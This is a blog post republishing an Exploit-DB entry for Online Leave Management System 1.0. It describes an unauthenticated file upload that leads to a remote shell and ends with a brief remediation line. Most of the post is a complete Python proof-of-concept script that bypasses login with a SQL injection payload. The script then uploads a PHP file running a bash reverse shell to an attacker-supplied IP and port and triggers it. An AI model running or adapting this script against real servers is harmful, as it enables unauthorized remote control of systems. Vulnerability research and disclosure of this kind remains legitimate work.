---
layout: post
title: Unauthenticated File Upload in Online Leave Management System 1.0
date: 2024-11-12 11:12 -0800
tag: [exploit-db]
category: [Vulnerability Research]
---

# Online Leave Management System 1.0 - Arbitrary File Upload to Shell (Unauthenticated)

**Exploit ID**: 50228  
**Author**: Justin White  
**Platform**: PHP  
**Date Published**: 2021-08-25  
**Vulnerable Application**: [Online Leave Management System 1.0](https://www.sourcecodester.com/php/14910/online-leave-management-system-php-free-source-code.html)

## Description

This vulnerability allows unauthenticated users to upload arbitrary files in the Online Leave Management System 1.0. By uploading a malicious PHP file, attackers can gain remote shell access to the server.

## Proof of Concept (PoC)

Use the following Python script to upload a reverse shell:

``` python
#!/bin/env python3
import requests
import time
import sys

if len(sys.argv) != 4:
    print('python3 script.py <target url> <attacker ip> <attacker port>')
    print('Example: python3 script.py http://127.0.0.1/ 10.0.0.1 4444')
    exit()

else:
    try:
        url = sys.argv[1]
        attacker_ip = sys.argv[2]
        attacker_port = sys.argv[3]
        print()
        print('[*] Trying to login...')
        time.sleep(1)
        login = url + '/classes/Login.php?f=login'
        payload_name = "reverse_shell.php"
        payload_file = r"""<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/\"{}\"/{} 0>&1'");?>""".format(attacker_ip, attacker_port)
        session = requests.session()
        post_data = {"username": "'' OR 1=1-- -'", "password": "'' OR 1=1-- -'"}
        user_login = session.post(login, data=post_data)
        cookie = session.cookies.get_dict()

        if user_login.text == '{"status":"success"}':
            print('[+] Successfully Signed In!')
            upload_url = url + "/classes/Users.php?f=save"
            cookies = cookie
            headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0", "Accept": "*/*", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "X-Requested-With": "XMLHttpRequest", "Content-Type": "multipart/form-data; boundary=---------------------------221231088029122460852571642112", "Origin": "http://localhost", "Connection": "close", "Referer": "http://localhost/leave_system/admin/?page=user"}
            data = "-----------------------------221231088029122460852571642112\r\nContent-Disposition: form-data; name=\"id\"\r\n\r\n1\r\n-----------------------------221231088029122460852571642112\r\nContent-Disposition: form-data; name=\"firstname\"\r\n\r\nAdminstrator\r\n-----------------------------221231088029122460852571642112\r\nContent-Disposition: form-data; name=\"lastname\"\r\n\r\nAdmin\r\n-----------------------------221231088029122460852571642112\r\nContent-Disposition: form-data; name=\"username\"\r\n\r\nadmin\r\n-----------------------------221231088029122460852571642112\r\nContent-Disposition: form-data; name=\"password\"\r\n\r\n\r\n-----------------------------221231088029122460852571642112\r\nContent-Disposition: form-data; name=\"img\"; filename=\"" + payload_name +"\"\r\nContent-Type: application/x-php\r\n\r\n\n " + payload_file + "\n\n\r\n-----------------------------221231088029122460852571642112--\r\n"
            print('[*] Trying to Upload Reverse Shell...')
            time.sleep(2)

            try:
                print('[+] Reverse Shell Uploaded!')
                upload = session.post(upload_url, headers=headers, cookies=cookie, data=data)
                upload_check = f'{url}/uploads'
                r = requests.get(upload_check)
                if payload_name in r.text:
                    
                    payloads = r.text.split('<a href="')
                    for load in payloads:

                        if payload_name in load:
                            payload = load.split('"')
                            payload = payload[0]
                        else:
                            pass
                else:
                    exit()

            except:
                print('[-] Upload failed, try again in a little bit!!!!!!\n')
                exit()

            try:
                print('[+] Check Your Listener!\n')
                connect_url = url + '/uploads/'
                r = requests.get(connect_url + payload)

            except:
                print('[-] Failed to find reverse shell. Check {connect_url} or try again!\n')
                
        else:
            print('[-] Login failed!\n')

    except:
        print('[!] Something Went Wrong!\n')

```

## Additional Information

- **Tested On**: Linux (Ubuntu 20.04)

## Remediation

To prevent this vulnerability, restrict file uploads to only accept non-executable file types.

[View this exploit on Exploit-DB](https://www.exploit-db.com/exploits/50228)
